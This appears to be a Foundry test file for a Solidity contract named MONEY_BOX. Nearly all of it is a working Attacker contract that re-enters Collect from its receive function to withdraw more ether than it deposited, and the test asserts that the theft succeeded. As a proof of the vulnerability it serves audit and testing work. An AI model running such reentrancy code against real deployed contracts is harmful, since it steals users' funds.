
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MONEY_BOX, Log} from "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {
    MONEY_BOX public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MONEY_BOX();
        _log = new Log();
        _contractUnderTest.SetLogFile(address(_log));
        _contractUnderTest.SetMinSum(1 wei);
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < 10 ether);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        vm.warp(block.timestamp + 1000);

        _attacker.setupAttack{value: attackVal}(attackVal);

        vm.warp(block.timestamp + 2000);

        uint256 victimStart = address(_contractUnderTest).balance;

        _attacker.attack(attackVal);

        uint256 victimEnd = address(_contractUnderTest).balance;

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertLt(victimEnd, victimStart, "Victim balance did not decrease as expected.");
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = MONEY_BOX(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;

        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        attackCallCount = 0;

        _victim.Collect(val);

        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount == 0) {
            attackCallCount++;
            uint256 victimBal = address(_victim).balance;
            uint256 attackerBal = address(this).balance;

            uint256 toCollect = storedAttackVal;
            if (toCollect > victimBal) {
                toCollect = victimBal;
            }
            if (toCollect == 0) return;

            if (attackerBal + toCollect > attackerBal && address(_victim).balance >= toCollect) {
                _victim.Collect(toCollect);
            }
        } else {
            attackCallCount++;
        }
    }
}
